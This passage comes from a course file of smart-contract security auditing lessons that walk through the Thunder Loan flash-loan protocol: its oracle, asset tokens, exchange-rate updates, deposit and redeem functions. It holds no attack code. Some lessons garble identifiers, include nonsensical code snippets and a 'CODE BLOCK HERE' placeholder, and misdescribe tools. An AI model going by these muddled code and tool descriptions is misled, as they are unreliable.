          ## When It Gets Interesting - getPrice in WETH

          One striking feature that piqued our interest is the `getPrice in WETH`. It is an external public view. Here‚Äôs how it works:

          - An address swap of pool tokens is initiated.
          - A specific token is passed through, utilizing the command `Ipool_factory_s_pool_token`.
          - To round this up, `Getpool pool` is then invoked, which is where `get pool tokens` comes in.

          ![](https://cdn.videotap.com/wbYYfuMAg04eG7LYpZp8-48.15.png)

          To be put simply, we capture the pool swap token, call on `getPrice of one pool token in WETH`, and voila!

          Interestingly, this entire process could be completed sans any knowledge of TSWAP. We could still continue with our security review and audit, completely ignoring TSWAP. That being said, it invariably adds value to understand the inner workings of TSWAP.

          > If we can identify a loophole or break in this function on TSWAP, it could potentially lead us to finding cracks in Oracle Upgradable as well.

          In essence, whenever we invoke an external contract, one should instantly scan for attack vectors. Questions to ask include: could the price be manipulated? Is there potential for reentrancy attacks?

          ## The Mystery of TSWAP

          Having explored the intriguing aspects of getPrice in WETH, let's unravel TSWAP. Within TSWAP, the main operational functions appear to be `getPrice of pool token in WETH` and `getPool`.

          ![](https://cdn.videotap.com/5cZTXH0KnXV4ii8uCDjE-96.3.png)

          To an unskilled eye, it might seem as though the getPrice command redundantly repeats itself. That might be true. Nevertheless, it is doing two distinctly separate tasks ‚Äî it computes the output amount based on an input utilising reserves to ascertain the asset price and pulls out the pool.

          ## Tests Evaluation

          Now let's move to testing, using `units thunderloane test sol` or `Oracleupgradable sol`. If we individualise each point, we can see they are using a mock pool factory for interaction.

          Upon closer examination, we can ascertain they are using constraints, which might be a potential issue. An audit informational note would be to recommend them to use forked tests for live protocols.

          Why you may ask? Forked tests simply offer higher guarantees of successful operation.

          ![](https://cdn.videotap.com/fEeOEcrvj5RmWqYZn9Sd-128.4.png)

          ## Attack Vector Investigation

          Let's take potential attack vectors as an example.

          The `getPrice in WETH` function poses few directly observable issues. However, as we dig deeper, doubts start to emerge. What if someone could break this function? Could the priveleges be misused?

          A seemingly harmless function like `getPool, factory address` also needs to be observed closely. On the surface, it looks quite uncomplicated, with a private variable being used to extract the address ‚Äî all good so far.

          ## Initializer Front Run ‚Äì A Possibility?

          Nevertheless, while reviewing the `getPrice in WETH` function, we stumble upon an issue - the possibility of initializer front runs. Although in competitive audits such threats are usually overlooked, protocols still need to be warned of this possibility.

          Remembering the infamous attack: What delicate maneuvers are being employed to ensure there's no front run?

          ## Wrapping it Up

          ![](https://cdn.videotap.com/4CT0yiquS1CTN2jjVFe4-176.55.png)

          Our intense review journey culminates here, having done a fairly comprehensive review, exploring the Oracle Upgradable in its entirety, bringing potential lows to light, such as the chance of initializer front-runs.

          But nonetheless, completing yet another successful review delivers a sense of accomplishment. And so, Oracle Upgradable ‚Äì ticked off and aced!

          Our checklist continues to shorten. Stay tuned for the next fascinating code critique in our series. Happy coding!

          > "Security is a process, not a product. Let's continue this journey together!"
        description: '"GetPriceInWeth" Function Inspection.'
      -
        id: e5fa2499-e153-4854-8391-1dd83033c999
        type: new_lesson
        enabled: true
        title: AssetToken.sol
        slug: assettoken
        duration: 10
        video_url: 9vg9eb8orNC2U3VNkpkvJOLfSzRiPC8TPu26uuqIU400
        raw_markdown_url: /routes/security/6-thunder-loan/24-assettoken/+page.md
        markdown_content: |-
          ---
          title: AssetToken.sol
          ---

          In today's lesson, we will dissect and understand the process and chronology of AssetToken.sol while simultaneously attempting to reduce the complexity of this unwieldy 129-line monster code. We will be following the analysis methods of one of the smart contract industry's finest - Tincho.

          ![](https://cdn.videotap.com/ymeUVPEJfTmzpyvsbUJU-38.26.png)

          Although the enormity of the code may make the checklist seem redundant, it is essential to understand that this seemingly lightweight tool can provide both structure and context, serving as a roadmap when trudging through unknown territories of the code.

          ## Tackling AssetToken.sol Line-by-Line

          Eagle-eyeing the checklist we realize that we have revealed another checkmark, indicating we are ready to plow into AssetToken.sol. As we delve deeper, the checklist will begin to take a back seat, but remember, it remains an invaluable tool to grasp the overall context and provide a starting point for understanding the essence of these components.

          ### Thunderloan Digitization

          Thunderloan serves as an apt milestone in our journey. We will first scour Thunderloan, before advancing to its upgraded version. The sequence may seem counterintuitive due to the contracted length of its upgraded edition. However, a profound understanding of the current protocol is instrumental in discerning the necessities for upgrades. The supposed 327-line-dependent code may differ drastically, but only time will tell!

          Now, let's proceed to dissect AssetToken.sol. It exemplifies the receipt role in our smart contract. It enables liquidity providers to deposit assets into Thunderloan, in return for asset tokens. The accumulation of interest over time is influenced by the number of people who borrow flash loans.

          Borrowing our previous Flash loans example, consider a whale who deposits money into a Flash loan contract. In return, they receive shares or a token representative of the money they've placed in the contract. This share-token accrues interest based on the flash loan borrowers' fees.

          The role of Open Zeppelin's ERC20 here needs special mention. It provides an interface and a wrapper around ERC20 operations that would typically fail if the token contract returned false. The wrapper, aptly named Safe ERC20, serves as a fail-safe for erratic ERC20s, throwing on failure to prevent compromising the entire operation.

          ## Unveiling Asset Token and Shares

          As we dig deeper, mining further insights from the wall of text, a pattern begins to emerge. The term "underlying" in the code seems to refer to USDC, whereas the "asset token" is linked to the pool's shares. Depositing USDC gives you pool shares proportionate to the exchange rate defined within the contract.

          > "For instance, if we have two shares and the exchange rate is two to one, we can exchange our two shares for four tokens."

          How they calculate the exchange rate mirrors the workings of Compound Finance, underlining the deliberateness in the design. If we can master understanding the contract's innards, unraveling the rest of the mysteries becomes a breeze.

          ### Side Quest into Compound's Territories

          At this juncture, it might be advantageous to wander into the realm of Compound, discern how it functions and sift out any potential issues. Familiarity with similar protocols can empower us in our mission to secure this contract.

          However, we won't be trailing down this path today. It is, nonetheless, a recommended sidequest to undertake at some stage. Try writing a concise, understandable article explaining the working protocol of Compound, or even the comparable Aave.

          ## Tracing the Exchange Rate Pattern

          Returning to our original predicament, we bump into our exchange rate again, causing us to raise an eyebrow. This instance hints at a potential bug spot in our code.

          The next issue arises during the creation of new asset tokens or shares. Minting new asset tokens conducts an access control check to confirm the caller is the Thunderloan contract.

          > "This begs the question, could an attack vector appear that allows an attacker to call mint from the Thunderloan contract when they shouldn't?"

          In the same vein, burning existing asset tokens or shares runs a similar check. Our questioning spirits seek an answer from the code. Could non-standard, "weird" ERC20s wreck havoc in our methods - Safetransfer? And more specifically, what if USDC decided to blacklist contracts (like thunder loan or the asset token contract)? A medium to low priority question but worth a nod.

          ### Minting New Conclusions

          Wrapping up our intricate dissection of the code, we are left with relevant questions that will guide us down the path of systematizing a secure, functional protocol. As we remain vigilant, aiming to decipher the mysteries of our smart contract, let us head over to the next complex labyrinth- Thunderloan.

          In the coming blog posts, we'll continue to explore potential security vulnerabilities, unravel other intriguing aspects of this code, and hopefully unlock more mysteries of smart contract security reviews. So, stay tuned and keep reading.
        description: 'Reviewing the functionality of AssetToken.sol and understanding how the code works.'
      -
        id: a0f06f3b-c211-4369-9667-636f39d1cb0a
        type: new_lesson
        enabled: true
        title: 'AssetToken.sol:updateExchangeRate'
        slug: asset-token-update-exchange-rate
        duration: 6
        video_url: bgmtCLets91K6QuBooY1r5RcIslnzXZLYqRmZPCLJUg
        raw_markdown_url: /routes/security/6-thunder-loan/25-asset-token-update-exchange-rate/+page.md
        markdown_content: |-
          ---
          title: AssetToken.sol - updateExchangeRate
          ---

          ## The Function: Update Exchange Rate

          Let's dive into a seemingly vital function called `updateExchangeRate()`. The comments clarify that it obtains the current exchange rate (#1) and computes it by dividing the fee size by the total supply. An intriguing remark states that the exchange rate should consistently increase‚Äînever decrease‚Äîan invariant principle at work. **But why should this exchange rate always escalate and never decline?**

          **CODE BLOCK HERE**

          As we delve deeper, we set:`newExchangeRate = oldExchangeRate * (totalSupply + fee) / totalSupply`.

          ![](https://cdn.videotap.com/gi422wVmQ3SFrgJrvlSw-84.97.png)

          As we break down how this formula functions:

          - If the old exchange rate is 1,
          - The total supply of asset tokens is 4,
          - Fee is 0.5,

          Computing ((4 + 0.5)/ 4), we result with a new exchange rate of 1.125. From this, it seems that `updateExchangeRate()` is likely responsible for updating the asset tokens' exchange rate to their underlying assets.

          To illustrate, imagine this hypothetical scenario where a whale deposits or withdraws shares. The amount that gets deposited or withdrawn hinges upon the exchange rate, which can change, presumably having something to do with the fee. In a scenario where the exchange rate is two to one, if a user were to deposit $1,000, they would receive 2000 asset tokens in return.

          **But why are we updating the exchange rate?**

          Let's revisit the above formula: What happens if the total supply is zero?As per the formula, `S exchange rate starts at 1 * 0 + let's say the fee is zero divided by zero`, the computation breaks. Would this pose an issue? Could there be a way that this could break and make the total supply zero? Questions to consider.

          ![](https://cdn.videotap.com/SLGckrl4g0AjIi7bUdwS-230.62.png)

          We check for a condition `if newExchangeRate <= oldExchangeRate`, then instruct it to revert, with a message saying, "Exchange rate can only increase." The condition itself is a clear implementation of the invariant principle stated earlier. On the other hand, if the new exchange rate is higher, it sets `sExchangeRate = newExchangeRate` before emitting an event.

          At a first glance, this function seems correct and ready to run. It updates the exchange rate, a crucial variable in the relationship between the shares and the underlying assets. The rate update mainly seems to be triggered by fees.

          ## Some Possible Improvements

          An important aspect that one could focus on is the multiple storage reads in the `updateExchangeRate( )` function‚Äî `s_ exchangeRate`, `s_totalSupply`, and `s_fee`. Given that storage reads are gas expensive, you could possibly optimize this by storing them as a memory variable‚Äîan aspect to consider during an audit for gas usage.

          Note: Sometimes, it is the experience that helps spot these potential storage issues. For instance, if you see multiple s\_ syntax terms, that might be a hint about multiple storage operations.

          ![](https://cdn.videotap.com/tGc23bAltPLCCdT51Y39-303.45.png)

          Despite not discovering any immediate problem with the contract, analyzing this function helped us understand the contract better. We now know how the exchange rate behaves, and it's clear that the fee plays a significant role in its computation.

          In the next phase, we plan on investigating two more functions‚ÄîThunderLoan and ThunderLoanUpgraded. We'll tackle ThunderLoan first, understand its functionalities thoroughly, then move onto ThunderLoanUpgraded to identify the upgrades.

          Stay tuned in for our exciting journey as we delve deeper to explore these functions. Keep coding!
        description: 'Patrick reviews the updateExchangeRate function, highlighting key parameters like fees, total supply, and potential gas usage issues.'
      -
        id: 3f374647-b6b6-4687-bda5-c4262ae1a79a
        type: new_lesson
        enabled: true
        title: 'Thunderloan: Starting At The Top'
        slug: thunderloan-starting-at-the-top
        duration: 9
        video_url: f1IpKW4LR6QUm3V7DWwnXIp5Pno022WuYMkMFyJqN71Y
        raw_markdown_url: /routes/security/6-thunder-loan/26-thunderloan-starting-at-the-top/+page.md
        markdown_content: |-
          ---
          title: Thunderloan.sol - Starting At The Top
          ---

          ## Initial Exploration: Imports

          Before we get our hands dirty with the functions, we start our journey with imports. There's plethora of imports in there, some of which include `Safe ERC 20`, `Asset token`, `IERC 20`, `Metadata`, `Ownable upgradable`, `Initializable`, `UUPs upgradable`, `Oracle Upgradable`, just to name a few.

          In order to facilitate the learning process, I will provide a preamble of our focus in each section, "priming your brain" to absorb the upcoming content. Educational studies support this method, indicating that offering a high-level overview before delving into deeper detailing enhances the learning experience.

          **Quick tip:** In order to better understand protocols, remember to go through their read-me's for a bird's eye view before examining the individual codes.

          Following this advice, let's start piecing together the puzzle. `Ownable upgradable` might be a newer import to some, so it might be beneficial to quickly explore it in Open Zeppelin. This is the only-owner contract but with an upgradable version. Taking a close look, we see that it uses `ownable init` and needs to set an initial owner and transfer ownership.

          ![](https://cdn.videotap.com/kyjLSLgBPsyDSSFpZ9P1-124.85.png)

          We also find a reference to `UUPs upgradable`, which implements the UUPs proxy pattern, a common pattern for smart contracts. If you‚Äôre unfamiliar with the UUPs proxy, I strongly recommend that you brush up on it or you could revisit the Foundry course and specifically look at the `Foundry upgrades F 23` for a better understanding.

          Finally, in the list of our imports, we come across `iFLASH loan receiver`, which is a library offering easier to use functions like `send value`.

          ## Diving Deep into the Smart Contract

          Next up, we ask, "While going top to bottom, have we asked enough questions?" Since there aren‚Äôt major issues with the imports, we move on.

          Looking at the contract `Thunderloan`, it is clearly recognizable that it extends `Initializable`, `Ownable upgradable`, `UUPs upgradable`, and `Oracle Upgradable`. Checking whether it should extend anything else, we find no, it's all good here.

          ![](https://cdn.videotap.com/8ErUx4D6tAmn03SvJNAC-218.48.png)

          In the next section, we encounter a bunch of constants and state variables, first of which is `token to asset token`. To gain a better understanding of its role, we do a quick search and find that it‚Äôs used in various operations like deposit, redeem, Flash loan, etc.

          ```code
          // State variableS token to asset token
          ```

          After some explanation and assumptions, we infer that this maps the underlying token to its asset token. For example, if a liquidity provider deposits USDC, it will generate a USDC asset token, representing the amount of USDC you've deposited.

          Following this, we stumble upon `fee in way`, which we verify by checking its initialization in the initializer function.

          Also, we encounter an auditing issue that `fee precision` should be either constant or immutable.

          Next is `token to currently flash loan`, so this is assumedly a mapping that notifies us if a token is mid flash loan.

          ## Delving into the Modifiers of our Smart Contract

          Well, we‚Äôve had our fair share of state variables. Now, it's time to unravel the modifiers.

          ```code
          revert if zero
          ```

          This modifier reverts operation if amount equals zero. The other modifier `revert if not allowed token`, ensures operation would only proceed with allowed token only.

          Turns out, there's a precheck for tokens, which as a result reduces the risk of passing bad tokens to the contract.

          ```code
          modifier not allowed token
          ```

          We find a function named `is allowed token`, and upon exploration, it returns `s token to asset token of the token does not equal zero`. Therefore, it seems it's only allowing a token if it has been set before.

          Lastly, we observe that most of this looks benign so far, but remember we're just getting started. In this initial inspection, we haven't really delved into the functions yet. But rest assured, there's more to find in this intriguing world of the Thunderloan Sol smart contract!
        description: 'Patrick begins his review of ThunderLoan.sol with an assessment of imports.'
      -
        id: 43164196-4157-43e1-a634-c202d8fd2b9e
        type: new_lesson
        enabled: true
        title: 'ThunderLoan Functions'
        slug: thunderloan-functions
        duration: 8
        video_url: NDd01ZCx8HtMKpkGgZhXyNea02ghmGz8co4K6WdmX00EmQ
        raw_markdown_url: /routes/security/6-thunder-loan/27-thunderloan-functions/+page.md
        markdown_content: |-
          ---
          title: Thunderloan.sol - Functions
          ---

          # Demystifying Smart Contracts: A Deep Dive into Functions, Constructors and Operators

          Learning how to build smart contracts is challenging, but the rewards are immense. To help you on this journey, in this blog post, we will scrutinize the intricate workings of smart contract functions, constructors, and more.

          ## Beginning with the Constructor

          First things first, we start by defining a constructor with a custom Oz (OpenZeppelin) upgrade ‚Äî `Unsafe Allow Constructor`. This construct serves to pacify static analysis tools that generally get riled up with all the initializer tricks we use.

          A vital keyword we use is `DisableInitializers` that originates directly from the Initializable package. It's a safeguard to prevent the inadvertent calling of any initializers in the constructor, an act we want to avoid at all costs because our smart contract is upgradable, and it exists behind a proxy.

          ### Understanding OwnableInit

          We already mentioned the effects of `initializer` modifier, particularly how it could get front run. Now, let's talk about `OwnableInit`. This function merely facilitates the transfer to the preliminary owner.

          ### Diving into UpgradableInit

          This function has the same modus operandi as `UUPsUpgradableInit`, setting up storage for UUPs. However, considering UUPs is a comprehensive subject, we will not go into its details for now.

          ### Getting Familiar with OracleInit

          To further understand `OracleInit`, imagine using T-Swap (an address) as a kind of oracle. There's also the initial fee precision and initial fee for flash loans.

          ## The Deposit Function

          This is a very crucial function and, yes, it's missing Natspec! It's essential to call this out and highlight the necessity of the Natspec. This function is responsible for allowing users to deposit their tokens into the contract, thus facilitating flash loans for other users.

          A few key takeaways from the deposit function:

          - If the deposited `amount` is zero, revert
          - If the token is not an allowed token, revert
          - The function also employs the mapping `sTokenToAssetToken` to evaluate which sToken corresponds to which AssetToken

          ## Setting Allowed Tokens

          A healthy exercise in understanding how these tokens are determined, let's look at the `setAllowedToken` function. In effect, it facilitates the setting or removal of tokens.

          This critical function is permissioned and can only be executed by the owner of the protocol. Here's how it works:

          - If the token is allowed, it is added to the `sTokenList`
          - If the token is to be disallowed, the function will proceed accordingly
          - The function reverts with the status of the token, i.e., whether it is `already allowed` or not

          ## Conclusion

          In conclusion, the journey into the realm of smart contracts can be a bit tricky and complex. Still, by analyzing the various functions and their specific roles, one can gain a solid understanding of their dynamics and workflow. Persistent learning, constant practice, and a practical mindset are all that's required to master smart contract development. And remember: always make use of Natspec for the sake of readability and developer friendliness. Happy Coding!
        description: 'Explore key functions like deposit and setAllowedToken. Security is emphasized through thorough documentation.'
      -
        id: 5a4c33fb-b6dc-4a5d-99fd-d123dbfddc28
        type: new_lesson
        enabled: true
        title: 'Testing Deleting Mappings'
        slug: testing-deleting-mappings
        duration: 3
        video_url: JQQsYsbP6ROypwK7802vWVRc163DtCQDtd4fUlUIM8Q4
        raw_markdown_url: /routes/security/6-thunder-loan/28-testing-deleting-mappings/+page.md
        markdown_content: |-
          ---
          title: Testing Deleting Mappings and Fixing Our Tools
          ---

          # Smart Contracts and Data Management: A Deep Dive into Token Mapping and Deletion

          Welcome to our deep dive discussion on asset tokens, deleting mappings, and the peculiarities of Solidity smart contracts. Today, we'll unravel how smart contracts interact with asset tokens and the possible pitfalls and bugs that can arise as we develop our applications.

          ## Deletion and Checks in Asset Token Mappings

          In a smart contract, we typically assign values and map `address` to `assetToken`.

          This line means, simply, we're assigning the token located at `assetToken` to a variable also named `assetToken`.

          Now, this can lead to a critical question:

          > Does deleting a mapping work?

          ![](https://cdn.videotap.com/EFG0Cihz1p7oQkV1y9Hx-36.9.png)

          It's a valid question because let's say we have several checks on `assetToken == 0`. If the deletion process doesn't work as expected, our asset won't return to 0. So, how do we test this?

          ## Testing Deletion with Chisel

          To explore this, I decided to pull up Chisel, a Solidity language extension for Visual Studio, and create a mapping with the structure `address` to `address`.

          In theory, when I look up `tokenToToken[address1]`, I'll get `address2`. Now, let's go ahead and attempt deletion:

          Consequently, when I look up `tokenToToken[address1]` after the deletion, I'm still getting `address2`. Clearly, something is off here.

          ![](https://cdn.videotap.com/nqmehgM9xG2CGsHOR1yI-80.5.png)

          ## Digging Deeper with Remix

          To further understand the issue, let's pull up Remix, a powerful, open-source tool used for writing Solidity smart contracts. We'll create a simple contract, aimed at mapping `address` to `address`.

          Following similar steps as before, we'll set the mapping between an account address and the contract address, then delete the mapping, and finally, check the mapping again.

          This time we get zero, contrary to what Chisel showed.

          ## A Bug in Foundry

          The probable conclusion? There's likely a bug with Foundry.

          Your logical next step should be heading to Foundry's GitHub page and opening an issue. Check out the existing issues first, of course. Search for "Chisel mappings" and see if there's a relevant issue already there. If nothing matches, make a new issue indicating the problem with Chisel mappings deletion.

          Here we've encountered a real-life bug, and we have done our part to inform the community about it. So, until next time, keep exploring, keep debugging, and keep developing.
        description: 'Patrick demonstrates using Chisel to test mapping deletion in a handler.'
      -
        id: 380a7e19-c5ed-471c-a3d6-dbe8ad472e6e
        type: new_lesson
        enabled: true
        title: 'Note On Linear Progress'
        slug: note-on-linear-progress
        duration: 2
        video_url: p01naqjLJp2ZRu00gU7TJgYticLIfIrkO7lAS4nG9FUC4
        raw_markdown_url: /routes/security/6-thunder-loan/29-note-on-linear-progress/+page.md
        markdown_content: |-
          ---
          title: A Note On The Linear Progress Of Security Reviews
          ---

          # Evaluating Smart Contract Security: Journey Through "Thunder Loan"

          Welcome, tech lovers! Today, we're taking a deep-dive into the riveting world of smart contract audits. In this post, we'll be dissecting a Tech Talk where we audited a smart contract named "Thunder Loan." Buckle up, it's going to be an exciting learning experience!

          ## Remix vs Chisel: The Battle of Testing Tools

          In the world of software development, it's not uncommon to use different tools for testing code. In this instance, we initially tested Thunder Loan using Remix and throughout our auditing process, we discovered a few things that are worth mentioning.

          _Fire up your terminal, it's time to discuss some code!_

          ![](https://cdn.videotap.com/86697zC0OHfWSFQSGKUh-13.33.png)

          When we attempted to delete particular sets of code, it appeared to work in Remix quite fluidly.

          ```javascript
          delete this;
          ```

          Despite the successful outcome in Remix, the same could not be said when we tried it in Chisel. As a coding auditor, I can safely say Remix was more accurate in this case. Chisel was, unfortunately, incorrect in its evaluation of the aforementioned code.

          ## Emitting Tokens and Asset Returns

          Next, we looked into the `Emit allowed token set` function. After careful examination, we were pleased to see that the system accurately complied.

          ```javascript
          emit allowedTokenSet;
          ```

          Following this, we went on to return the asset tokens.

          ```javascript
          return assetToken;
          ```

          Again, this process appeared to run smoothly. Keep in mind; one crucial aspect of an audit is multiple points of review. This helps maintain precision in an audit. I usually do an "Okay" check at the start and then perform another towards the end, as in "Audit in Foe."

          Also, another point to ponder; many tools such as Darren catch the "needs Nat spec" command pretty well. So while it may not seem necessary to include this, it could assist in accurate evaluations and maybe even in bug spotting!

          ## Deep Dive into the Deposit Function

          Now we've arrived at another integral part of our audit ‚Äì the deposit function. Furthermore, we explored the selection process for tokens.

          ```javascript
          add Token;remove Token;
          ```

          Here, things got a tad more interesting. The code seemed to be allowing the addition and removal of tokens at the will of the owner. While this is generally great, it might potential problems in the future. But, of course, only time will unveil that truth.

          ## Understanding the Non-linear Nature of Audits

          So far, we've gone through at least one function of Thunder Loan, and guess what - No bugs yet! But don't let that fool you. The absence of bugs at the initial stages does not necessarily illustrate a perfect system.

          > "Security reviews are often not linear. It's not like, oh, found a bug here, found a bug here, here, and then three bugs here, and then done. No! They are often exponential."

          By the time auditors gain a comprehensive understanding of the codebase, they are better equipped to identify bugs. If bugs are found along the way, that's a bonus!

          ## A Final Word

          At the end of the day, a thorough audit is more about understanding than it is about unearthing bugs. The more you understand the code, the more efficient you become in identifying any potential or existing bugs. As discouraging as it might seem when bugs fail to show up initially, remember, it's all part of the process! Happy coding, everyone!
        description: 'Patrick touches on the linear vs non-linear nature of security reviews.'
      -
        id: b1f60e02-ebdf-4dc1-a994-d22df5ceefa5
        type: new_lesson
        enabled: true
        title: 'ThunderLoan Continued'
        slug: thunderloan-continued
        duration: 5
        video_url: CLFwX7c7IpFlLXaaXRWiRdAElwI9C9o14xpJmSOO016g
        raw_markdown_url: /routes/security/6-thunder-loan/30-thunderloan-continued/+page.md
        markdown_content: |-
          ---
          title: Thunderloan.sol (Continued)
          ---

          # Understanding Asset Tokens and Exchange Rates in Thunder Loan

          Hello coders! In this blog post, we're delving into the world of contracts and tokens. If you're here, you know that asset tokens represent the shares of the pool. But honestly, how many times have we gone over that?

          Still, it's crucial to understand that the asset token represents just how much of the contract the whale or depositor actually owns.

          ## Getting the Asset Token

          ![](https://cdn.videotap.com/2I1K8YkcCB7hMk6vhMGv-37.2.png)
          To get the asset token, you simply use `AssetToken get exchange rate`. Here we're getting the exchange rate between USDC (the USD Coin) and the flash loan tokens. The key question here is: what ratio exists between these flash loan tokens and the underlying tokens?

          ## Minting the Amount

          Your mint amount is calculated from the amount deposited, maybe around 100 USDC, times the exchange rate precision times the asset rate. The exchange rate precision usually defaults to `1E 18`.

          For all you math enthusiasts, here's the calculation flow:

          ```bash
          Exchange rate precision = 1E 18100 (deposit amount) x 1E 18 (exchange rate precision) / Exchange rate = Mint amount
          ```

          If the exchange rate is 2, then you would have half the flash loan tokens in exchange for the 100 USDC, which stands to reason logically.

          > An important point to note here is that we cannot divide by zero in this context. The exchange rate cannot be zero and should preferably always be increasing, never decreasing. If you start at one, it should never decrease to zero due to the way asset tokens are conditioned.

          ## Emitting the Event

          The role of the event emitter comes into play high up in this process when we call `AssetToken mint`. This is only callable by the Flash Loan investors and passes fine, giving the depositor the mint amount.

          Interestingly, when a liquidity provider deposits, the money sits in the asset token contract, not in Thunder Loan. Hence, the money goes directly to the asset token contract.

          ## Calculating the Fee and Updating Exchange Rate

          In our final stage of the process, the calculated fee is determined using `getCalculatedFee`; this updates the exchange rate and the asset token amount is transferred from message sender to the address of the asset token.

          Here's where it could get a little confusing. Why are we calculating the fee of the flash loans at the deposit? And why are we updating the exchange rate?

          Let's examine the first issue; our flash loan calculation process goes like this:

          ```bash
          Value of borrowed token = Amount x getPrice / Fee precisionFee = Value of borrowed token x Flash loan fee / Fee precision
          ```

          However, it's perplexing as to why the fee of the flash loans would be calculated at this juncture in the depositing process.

          Secondly, the matter of updating the exchange rate also raises questions. If tokens are deposited, the exchange rate varies. If more is deposited, then what would the exchange rate be? This part seems a little disorienting, definitely warrants a follow-up audit as there may be something off here.

          Once these two issues are addressed, the process should work correctly. The user gets minted some asset tokens and the tokens are then transferred to the underlying.

          There are a few perplexing areas as noted which we look forward to addressing in future posts. Happy coding!
        description: 'Patrick covers depositing an asset token, setting up the exchange rate and transferring funds to the Asset Token contract.'
      -
        id: f2a37dbe-b59a-4741-b749-a9a1f05c5d59
        type: new_lesson
        enabled: true
        title: 'Diagramming ThunderLoan'
        slug: diagramming-thunderloan
        duration: 1
        video_url: uRxx2sXvfvMwm63IgNfNtEJIZW8Rr5101ggaObmKTmoM
        raw_markdown_url: /routes/security/6-thunder-loan/31-diagramming-thunderloan/+page.md
        markdown_content: |-
          ---
          title: Diagramming Thunder Loan
          ---

          # Understanding the Asset Token Lifecycle: A Deep Dive

          Looking at the origin of tokens can sometimes seem like staring into an abyss, especially when one is trying to break down complex DeFi protocols like how an Asset Token comes alive. However, it's not quite as convoluted as you might initially think. Grab a beverage of your choice, strap down and come with me on an exploration of the Asset Token Lifecycle.

          First, let's get started by laying the schematic foundation, the blueprint of our Asset Token universe. Transitioning thoughts into visuals and diagrams. You know, because a picture says a thousand words right?

          ## The Basic Anatomy of the Asset Token

          ![](https://cdn.videotap.com/2sWH0NEKSYYOOCz3JhNl-7.47.png)

          An essential part of the Asset Token lifecycle begins with the liquidity provider (LP), who owns USDC. As a first step, the LP 'calls deposit' to kickstart this entire process. The underlying USDC is sent to the asset token (Say, Asset Token A or USDC) during this deposit process.

          > _The deposit kickstarts the process, triggering a transaction into the Asset Token._

          At this stage, the contract governing the Asset Token is crucial. This contract plays the role of a storehouse, a vault that holds and secures the underlying USD.

          ## Asset Token Orchestrating Transactions

          Our adventure into the Asset Token Lifecycle takes us deep into the heart of interactions and transactions between different entities. The USDC held by the liquidity provider is sent over to the Asset Token post the deposit call. But that's not where the transactions stop.

          Finally, the Asset Token mint machine kicks into gear. The asset token mints the LP an equivalent amount of the underlying USD, following the deposit and storage of USDC. Seem complex? Let's simplify with a diagram!

          ![](https://cdn.videotap.com/2jNGLhZwIkTe4vPJr8UC-24.27.png)

          Here's how the transaction process goes:

          1. The LP owns USDC.
          2. The LP calls deposit, signaling intent to transition the USDC into an Asset Token.
          3. This deposit triggers a sequence where the USDC moves from the LP to the Asset Token.
          4. Once the USDC is in the Asset Token, the Asset Token mints an LP against the equivalent USDC.

          By reaching this point, we've successfully navigated the murky waters of the Asset Token lifecycle, from deposit call to minting of the LP. This journey underscoring the power of decentralized finance offers valuable insight into the ecosystem. But there's so much more to explore - start digging deeper into contract calls, consensus algorithms and tokenomics right now!

          In our opening diagram and explanation, the statements might seem broad or oversimplified ‚Äì that is far from the case! Each step occurs in a well-defined, precision-driven process. It's a well-oiled machine, offering insights into the unseen side of token generation and distribution. We shall continue to dissect further and reveal more layers to this 'simple' transaction as we move ahead.
        description: 'Patrick walks through diagramming Thunder Loan with emphasis on visualization using diagrams for better comprehension.'
      -
        id: 8fd6d0f7-584f-4553-a0c0-13843171df18
        type: new_lesson
        enabled: true
        title: 'ThunderLoan.sol Redeem'
        slug: thunderloan-redeem
        duration: 5
        video_url: UDidaP003wldQY55X99EvQ02723BGqVBOFtx5Ez024NNaw
        raw_markdown_url: /routes/security/6-thunder-loan/32-thunderloan-redeem/+page.md
        markdown_content: |-
          ---
          title: Thunderloan.sol - Redeem
          ---

          # How to Deposit and Redeem Asset Tokens: A Deep Dive into Blockchain Functions

          Welcome back to the world of token functions! Today, we're going to dive deep into deposit and redeem functions in a blockchain-based system. Strap in!

          ## Diving into the 'Deposit' Function

          First, let's revisit the `deposit` function. This function allows a user to deposit an underlying token in exchange for an asset token. In essence, the user puts their underlying token into the pool and receives the equivalent amount of asset tokens in return. We may return to it later, but it's critical to understand this function before we dig deeper into the `redeem`.

          ## Understanding the 'Redeem' Function

          ![](https://cdn.videotap.com/PFna6Zl1YqUpuTWXUXwx-48.27.png)

          Moving on, the `redeem` function plays the opposite role. Where the `deposit` function pulls in an underlying token, the `redeem` function withdraws the underlying token from the asset token. When using this function, we must specify the token from which we want to withdraw, and how much therein we want to withdraw.

          #### The Token Ambiguity

          At this point, you might be wondering - does "token" refer to the asset token or the underlying token? After a detailed scrutiny, we confirmed that it refers to the actual token to be withdrawn, not the asset token.

          ![](https://cdn.videotap.com/ez1kq5fAGd1OgsIQfDqE-86.88.png)

          Coming back to our code, we need to determine the exact asset token to withdraw (let's call it the 'actual asset token'). We have a revert of zero if the token is not allowed to be withdrawn, thus eliminating any unauthorized tokens.

          #### On User Experience and Exchange Rates

          This code incorporates an eye for user experience. If the amount equals the maximum, the contract returns the balance of asset tokens for the address (or 'message sender'). This function essentially lets a user say, "I have ten asset tokens for USDC, I want USDC equivalent to these ten tokens." And our function does exactly this.

          ![](https://cdn.videotap.com/54JcHcJspGCdA0pezifC-125.5.png)

          The maths underline the code logic:

          ```javascript
          amount_underlying =
            (amount_of_asset_token * exchange_rate) / asset_token_exchange_rate_precision;
          ```

          This takes into account the precision of the exchange rate - if the user wants `1 E 18` and the exchange rate is `1 E 18`, dividing by `1 E 18` would yield a `1 E 18` back.

          The function then emits a `redeemed` event and calls `assetsBurn` to burn the asset tokens from the user's holdings. This mirrors the process of deposit, but in reverse: where deposit multiplied the precision by the exchange rate, this instead multiplies the exchange rate by the precision.

          #### Handling Weird ERC 20 Tokens

          Looking at it from the outside, everything seems to be falling into place. But what if we're dealing with a non-standard ERC 20 token? Let's consider `USDT`, which has six decimals instead of eighteen (thus being referred to as a 'weirdo'). Would the equation still hold? After some calculations and investigations, we found that it does!

          ![](https://cdn.videotap.com/jWxqkTW1E5Jz4AjmtCqu-202.73.png)

          The redeem function came out looking pretty solid. There was no apparent issue with re-entry and it seemed to follow "Checks-Effects-Interactions" (CEI) principle, where it checks upfront, performs certain effects, and then carries out any required interactions. DEI is a widely-accepted guideline in Ethereum community to avoid common issues such as reentrancy attacks.

          With `redeem` function now in tow, we have two important functions - `deposit` and `redeem` - both seemingly bug-free.

          ![](https://cdn.videotap.com/nNvbG3E0OfsqbxJORxX2-231.69.png)

